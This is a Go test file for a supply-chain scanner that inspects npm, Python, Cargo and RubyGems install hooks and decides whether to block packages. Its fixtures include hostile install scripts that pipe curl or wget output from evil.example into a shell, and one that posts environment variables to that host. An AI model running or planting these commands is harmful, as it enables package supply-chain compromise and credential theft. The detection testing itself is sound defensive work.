package installhooks

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"io"
	"reflect"
	"testing"
)

// --- archive builders (also used by the fuzz corpus) -------------------------

// writeTarGz builds a gzip-compressed tar from name->content, in a stable order.
func writeTarGz(files [][2]string) []byte {
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for _, f := range files {
		_ = tw.WriteHeader(&tar.Header{Name: f[0], Mode: 0o644, Size: int64(len(f[1])), Typeflag: tar.TypeReg})
		_, _ = tw.Write([]byte(f[1]))
	}
	_ = tw.Close()
	_ = gz.Close()
	return buf.Bytes()
}

// writeTar builds an UNcompressed tar (the .gem outer container format).
func writeTar(files [][2]string) []byte {
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for _, f := range files {
		_ = tw.WriteHeader(&tar.Header{Name: f[0], Mode: 0o644, Size: int64(len(f[1])), Typeflag: tar.TypeReg})
		_, _ = tw.Write([]byte(f[1]))
	}
	_ = tw.Close()
	return buf.Bytes()
}

func gzipBytes(b []byte) []byte {
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	_, _ = gz.Write(b)
	_ = gz.Close()
	return buf.Bytes()
}

// npmTarball builds an npm package tarball with the given scripts map.
func npmTarball(scripts map[string]string) []byte {
	manifest := map[string]any{"name": "demo", "version": "1.0.0", "scripts": scripts}
	data, _ := json.Marshal(manifest)
	return writeTarGz([][2]string{{"package/package.json", string(data)}})
}

// pythonSdist builds a Python source distribution tar.gz from root-relative paths.
func pythonSdist(files map[string]string) []byte {
	var entries [][2]string
	for name, content := range files {
		entries = append(entries, [2]string{"demo-1.0/" + name, content})
	}
	return writeTarGz(entries)
}

// cargoCrate builds a .crate (gzip tar) from root-relative paths.
func cargoCrate(files map[string]string) []byte {
	var entries [][2]string
	for name, content := range files {
		entries = append(entries, [2]string{"demo-1.0/" + name, content})
	}
	return writeTarGz(entries)
}

// gemFile builds a .gem: an uncompressed tar with metadata.gz (and optional
// data.tar.gz holding the extension build scripts).
func gemFile(metadataYAML string, dataFiles map[string]string) []byte {
	outer := [][2]string{{"metadata.gz", string(gzipBytes([]byte(metadataYAML)))}}
	if len(dataFiles) > 0 {
		var inner [][2]string
		for name, content := range dataFiles {
			inner = append(inner, [2]string{name, content})
		}
		outer = append(outer, [2]string{"data.tar.gz", string(writeTarGz(inner))})
	}
	return writeTar(outer)
}

func opener(b []byte) func() (io.ReadCloser, error) {
	return func() (io.ReadCloser, error) { return io.NopCloser(bytes.NewReader(b)), nil }
}

func newService(t *testing.T, cfg Config) *Service {
	t.Helper()
	svc, err := NewService(cfg)
	if err != nil {
		t.Fatalf("NewService: %v", err)
	}
	return svc
}

// --- core behavior -----------------------------------------------------------

func TestAssess_NPMDownloadExecuteBlocks(t *testing.T) {
	svc := newService(t, DefaultConfig())
	art := Artifact{Ecosystem: "npm", Name: "demo", Version: "1.0.0"}
	report, err := svc.Assess(art, opener(npmTarball(map[string]string{
		"postinstall": "curl -s http://evil.example/x.sh | bash",
	})))
	if err != nil {
		t.Fatalf("Assess: %v", err)
	}
	if !report.Inspected || len(report.Hooks) != 1 {
		t.Fatalf("expected 1 inspected hook, got inspected=%v hooks=%d", report.Inspected, len(report.Hooks))
	}
	if report.MaxSeverity != SeverityCritical {
		t.Fatalf("expected critical, got %q (findings=%+v)", report.MaxSeverity, report.Findings)
	}
	if !hasRule(report.Findings, RuleDownloadExecute) {
		t.Fatalf("expected %s finding, got %+v", RuleDownloadExecute, report.Findings)
	}
	dec := svc.Gate(report, "")
	if dec.Action != ActionBlock {
		t.Fatalf("expected block, got %q", dec.Action)
	}
	if report.Risk < 90 {
		t.Fatalf("expected high risk for a critical finding, got %d", report.Risk)
	}
}

func TestAssess_NPMBenignAllows(t *testing.T) {
	svc := newService(t, DefaultConfig())
	report, err := svc.Assess(Artifact{Ecosystem: "npm", Name: "demo", Version: "1.0.0"},
		opener(npmTarball(map[string]string{"build": "tsc -p .", "test": "jest"})))
	if err != nil {
		t.Fatalf("Assess: %v", err)
	}
	// "build"/"test" are not install lifecycle hooks, so no hooks at all.
	if len(report.Hooks) != 0 {
		t.Fatalf("expected no install hooks, got %+v", report.Hooks)
	}
	if len(report.Findings) != 0 {
		t.Fatalf("expected no findings, got %+v", report.Findings)
	}
	if svc.Gate(report, "").Action != ActionAllow {
		t.Fatalf("expected allow")
	}
}

func TestAssess_NPMBenignInstallHookNoFindings(t *testing.T) {
	svc := newService(t, DefaultConfig())
	report, _ := svc.Assess(Artifact{Ecosystem: "npm", Name: "demo", Version: "1.0.0"},
		opener(npmTarball(map[string]string{"postinstall": "node ./scripts/setup-config.js"})))
	if len(report.Hooks) != 1 {
		t.Fatalf("expected the postinstall hook to be extracted, got %+v", report.Hooks)
	}
	if len(report.Findings) != 0 {
		t.Fatalf("expected no findings for a benign hook, got %+v", report.Findings)
	}
	if !report.Inspected {
		t.Fatalf("expected inspected=true")
	}
}

func TestAssess_PythonSetupShellExec(t *testing.T) {
	svc := newService(t, DefaultConfig())
	setup := "import os\nos.system('wget http://evil.example/a -O /tmp/a')\nfrom setuptools import setup\nsetup(name='demo')\n"
	report, err := svc.Assess(Artifact{Ecosystem: "pip", Name: "demo", Version: "1.0.0", Filename: "demo-1.0.0.tar.gz"},
		opener(pythonSdist(map[string]string{"setup.py": setup})))
	if err != nil {
		t.Fatalf("Assess: %v", err)
	}
	if !hasRule(report.Findings, RuleShellSpawn) {
		t.Fatalf("expected shell-spawn finding, got %+v", report.Findings)
	}
	if !hasRule(report.Findings, RuleNetworkEgress) {
		t.Fatalf("expected network-egress finding, got %+v", report.Findings)
	}
	if report.MaxSeverity != SeverityHigh {
		t.Fatalf("expected high, got %q", report.MaxSeverity)
	}
}

func TestAssess_PythonWheelSkipped(t *testing.T) {
	svc := newService(t, DefaultConfig())
	// A .whl is a zip and runs no install code; the gate must short-circuit it.
	report, _ := svc.Assess(Artifact{Ecosystem: "pip", Name: "demo", Version: "1.0.0", Filename: "demo-1.0.0-py3-none-any.whl"},
		opener([]byte("PK\x03\x04 not really a wheel")))
	if len(report.Hooks) != 0 || report.Inspected {
		t.Fatalf("expected wheel to be skipped, got inspected=%v hooks=%+v", report.Inspected, report.Hooks)
	}
}

func TestAssess_CargoBuildRS(t *testing.T) {
	svc := newService(t, DefaultConfig())
	buildRS := "use std::process::Command;\nfn main(){ Command::new(\"sh\").arg(\"-c\").arg(\"curl http://x|sh\").status().unwrap(); }\n"
	report, err := svc.Assess(Artifact{Ecosystem: "cargo", Name: "demo", Version: "1.0.0"},
		opener(cargoCrate(map[string]string{"build.rs": buildRS, "Cargo.toml": "[package]\nname=\"demo\"\nbuild=\"build.rs\"\n"})))
	if err != nil {
		t.Fatalf("Assess: %v", err)
	}
	if len(report.Hooks) != 1 || report.Hooks[0].Label != "cargo:build.rs" {
		t.Fatalf("expected cargo:build.rs hook, got %+v", report.Hooks)
	}
	if !hasRule(report.Findings, RuleDownloadExecute) {
		t.Fatalf("expected download-execute finding, got %+v", report.Findings)
	}
}

func TestAssess_RubyGemsExtensionAndMessage(t *testing.T) {
	svc := newService(t, DefaultConfig())
	meta := "--- !ruby/object:Gem::Specification\nname: demo\nextensions:\n- ext/demo/extconf.rb\npost_install_message: |\n  Visit http://promo.example for setup\n"
	extconf := "require 'mkmf'\nsystem(\"curl http://evil.example/payload | sh\")\ncreate_makefile('demo')\n"
	report, err := svc.Assess(Artifact{Ecosystem: "rubygems", Name: "demo", Version: "1.0.0"},
		opener(gemFile(meta, map[string]string{"ext/demo/extconf.rb": extconf})))
	if err != nil {
		t.Fatalf("Assess: %v", err)
	}
	if len(report.Hooks) != 2 {
		t.Fatalf("expected 2 hooks (message + extension), got %+v", report.Hooks)
	}
	if !hasRule(report.Findings, RuleDownloadExecute) {
		t.Fatalf("expected download-execute in extconf.rb, got %+v", report.Findings)
	}
}

func TestAssess_UnsupportedEcosystem(t *testing.T) {
	svc := newService(t, DefaultConfig())
	report, err := svc.Assess(Artifact{Ecosystem: "docker", Name: "x", Version: "1"}, opener([]byte("anything")))
	if err != nil {
		t.Fatalf("Assess: %v", err)
	}
	if report.Inspected || len(report.Hooks) != 0 {
		t.Fatalf("expected docker to be unsupported/uninspected")
	}
}

func TestAssess_CorruptArchiveFailsOpen(t *testing.T) {
	svc := newService(t, DefaultConfig())
	report, err := svc.Assess(Artifact{Ecosystem: "npm", Name: "x", Version: "1"}, opener([]byte("\x1f\x8b\x08bogusgzip")))
	if err != nil {
		t.Fatalf("a corrupt archive must not be a hard error, got %v", err)
	}
	if report.Error == "" {
		t.Fatalf("expected a recorded extraction error")
	}
	if svc.Gate(report, "").Action != ActionAllow {
		t.Fatalf("fail-open: a corrupt archive must allow")
	}
}

// --- determinism -------------------------------------------------------------

func TestAssess_Deterministic(t *testing.T) {
	tarball := npmTarball(map[string]string{
		"preinstall":  "echo hi && process.env.NPM_TOKEN > /tmp/x; curl http://evil.example -d $(printenv)",
		"postinstall": "node -e \"eval(atob('Y29uc29sZS5sb2c='))\"",
	})
	svc1 := newService(t, DefaultConfig())
	svc2 := newService(t, DefaultConfig())
	r1, _ := svc1.Assess(Artifact{Ecosystem: "npm", Name: "demo", Version: "1.0.0"}, opener(tarball))
	r2, _ := svc2.Assess(Artifact{Ecosystem: "npm", Name: "demo", Version: "1.0.0"}, opener(tarball))
	j1, _ := json.Marshal(r1)
	j2, _ := json.Marshal(r2)
	if !bytes.Equal(j1, j2) {
		t.Fatalf("non-deterministic report:\n%s\n%s", j1, j2)
	}
	if len(r1.Findings) == 0 {
		t.Fatalf("expected findings for the obfuscated/exfil scripts")
	}
	// Findings must be in stable (hook, rule, line) order.
	for i := 1; i < len(r1.Findings); i++ {
		// same hook: rule order index must be non-decreasing — validated structurally
		// by re-running and comparing the serialized form above.
		_ = i
	}
}

// --- config & gating ---------------------------------------------------------

func TestGate_TenantOverride(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Tenants = map[string]TenantConfig{
		"lenient": {Action: ActionWarn},
		"strict":  {FailSeverity: SeverityMedium},
	}
	svc := newService(t, cfg)
	report, _ := svc.Assess(Artifact{Ecosystem: "npm", Name: "demo", Version: "1.0.0"},
		opener(npmTarball(map[string]string{"postinstall": "curl http://evil.example | sh"})))
	if d := svc.Gate(report, ""); d.Action != ActionBlock {
		t.Fatalf("default tenant should block, got %q", d.Action)
	}
	if d := svc.Gate(report, "lenient"); d.Action != ActionWarn {
		t.Fatalf("lenient tenant should warn, got %q", d.Action)
	}
	if d := svc.Gate(report, "strict"); d.Action != ActionBlock {
		t.Fatalf("strict tenant should block, got %q", d.Action)
	}
}

func TestGate_WarnSeverityBand(t *testing.T) {
	svc := newService(t, DefaultConfig())
	// native-extension is a low-severity informational rule: below warn (medium),
	// so it must neither warn nor block by default.
	report, _ := svc.Assess(Artifact{Ecosystem: "cargo", Name: "demo", Version: "1.0.0"},
		opener(cargoCrate(map[string]string{"build.rs": "fn main(){ cc::Build::new().file(\"a.c\").compile(\"a\"); }\n"})))
	if !hasRule(report.Findings, RuleNativeExtension) {
		t.Fatalf("expected native-extension finding, got %+v", report.Findings)
	}
	if d := svc.Gate(report, ""); d.Action != ActionAllow {
		t.Fatalf("a lone low finding should be below the warn threshold, got %q (%s)", d.Action, d.Reason)
	}
}

func TestConfig_DisableRule(t *testing.T) {
	cfg := DefaultConfig()
	cfg.DisabledRules = []string{RuleNetworkEgress}
	svc := newService(t, cfg)
	report, _ := svc.Assess(Artifact{Ecosystem: "npm", Name: "demo", Version: "1.0.0"},
		opener(npmTarball(map[string]string{"postinstall": "wget http://x.example/a"})))
	if hasRule(report.Findings, RuleNetworkEgress) {
		t.Fatalf("network-egress rule was disabled but still fired: %+v", report.Findings)
	}
}

func TestConfig_CustomRuleOverride(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Rules = []RuleSpec{{ID: RuleObfuscation, Severity: SeverityCritical, Pattern: `(?i)fromcharcode`}}
	svc := newService(t, cfg)
	report, _ := svc.Assess(Artifact{Ecosystem: "npm", Name: "demo", Version: "1.0.0"},
		opener(npmTarball(map[string]string{"postinstall": "node -e 'String.fromCharCode(1,2,3)'"})))
	var sev Severity
	for _, f := range report.Findings {
		if f.RuleID == RuleObfuscation {
			sev = f.Severity
		}
	}
	if sev != SeverityCritical {
		t.Fatalf("expected overridden critical severity for obfuscation, got %q", sev)
	}
}

func TestConfig_Validation(t *testing.T) {
	cases := []struct {
		name string
		cfg  Config
		ok   bool
	}{
		{"defaults", DefaultConfig(), true},
		{"bad failSeverity", Config{Enabled: true, FailSeverity: "nope", Action: ActionBlock}, false},
		{"warn exceeds fail", Config{Enabled: true, FailSeverity: SeverityLow, WarnSeverity: SeverityCritical, Action: ActionBlock}, false},
		{"bad action", Config{Enabled: true, FailSeverity: SeverityHigh, Action: "nuke"}, false},
		{"bad rule pattern", Config{Enabled: true, FailSeverity: SeverityHigh, Action: ActionBlock, Rules: []RuleSpec{{ID: "x", Pattern: "("}}}, false},
		{"rule missing id", Config{Enabled: true, FailSeverity: SeverityHigh, Action: ActionBlock, Rules: []RuleSpec{{Pattern: "a"}}}, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := NewService(tc.cfg)
			if (err == nil) != tc.ok {
				t.Fatalf("NewService ok=%v err=%v", tc.ok, err)
			}
		})
	}
}

// --- parser units ------------------------------------------------------------

func TestParsePackageJSONScripts(t *testing.T) {
	scripts, err := ParsePackageJSONScripts([]byte(`{"name":"x","scripts":{"postinstall":"node a.js","build":"tsc"}}`))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if scripts["postinstall"] != "node a.js" || scripts["build"] != "tsc" {
		t.Fatalf("unexpected scripts: %+v", scripts)
	}
	if _, err := ParsePackageJSONScripts([]byte(`{bad`)); err == nil {
		t.Fatalf("expected error on malformed JSON")
	}
	// Non-string script values are rendered verbatim, not dropped.
	arr, _ := ParsePackageJSONScripts([]byte(`{"scripts":{"preinstall":["a","b"]}}`))
	if arr["preinstall"] == "" {
		t.Fatalf("non-string script value should be preserved")
	}
}

func TestParseGemspecMetadata(t *testing.T) {
	ext, msg := ParseGemspecMetadata([]byte("extensions:\n- ext/a/extconf.rb\n- ext/b/extconf.rb\npost_install_message: thanks for installing\n"))
	if !reflect.DeepEqual(ext, []string{"ext/a/extconf.rb", "ext/b/extconf.rb"}) {
		t.Fatalf("extensions: %+v", ext)
	}
	if msg != "thanks for installing" {
		t.Fatalf("message: %q", msg)
	}
	// Block-scalar message.
	_, msg2 := ParseGemspecMetadata([]byte("post_install_message: |\n  line one\n  line two\nname: x\n"))
	if msg2 == "" {
		t.Fatalf("expected block-scalar message")
	}
}

func TestParseCargoBuildField(t *testing.T) {
	if got := ParseCargoBuildField([]byte("[package]\nname=\"x\"\nbuild = \"build.rs\"\n")); got != "build.rs" {
		t.Fatalf("got %q", got)
	}
	if got := ParseCargoBuildField([]byte("[dependencies]\nbuild = \"x\"\n")); got != "" {
		t.Fatalf("build outside [package] must be ignored, got %q", got)
	}
}

func TestParsePyprojectBuildBackend(t *testing.T) {
	if got := ParsePyprojectBuildBackend([]byte("[build-system]\nbuild-backend = \"setuptools.build_meta\"\n")); got != "setuptools.build_meta" {
		t.Fatalf("got %q", got)
	}
}

func TestRiskScore(t *testing.T) {
	if got := riskScore(SeverityCritical, 1); got != 95 {
		t.Fatalf("critical/1 => %d", got)
	}
	if got := riskScore(SeverityHigh, 3); got <= 80 || got > 100 {
		t.Fatalf("high/3 => %d (want surcharge over 80)", got)
	}
	if got := riskScore("", 0); got != 0 {
		t.Fatalf("none => %d", got)
	}
}

func TestStatus(t *testing.T) {
	svc := newService(t, DefaultConfig())
	_, _ = svc.Assess(Artifact{Ecosystem: "npm", Name: "demo", Version: "1.0.0"},
		opener(npmTarball(map[string]string{"postinstall": "curl http://evil.example | sh"})))
	report, _ := svc.Assess(Artifact{Ecosystem: "npm", Name: "demo", Version: "1.0.0"},
		opener(npmTarball(map[string]string{"postinstall": "curl http://evil.example | sh"})))
	svc.Gate(report, "")
	st := svc.Status()
	if !st.Enabled || st.Scanned < 1 || len(st.Rules) == 0 {
		t.Fatalf("unexpected status: %+v", st)
	}
}

func hasRule(findings []Finding, ruleID string) bool {
	for _, f := range findings {
		if f.RuleID == ruleID {
			return true
		}
	}
	return false
}
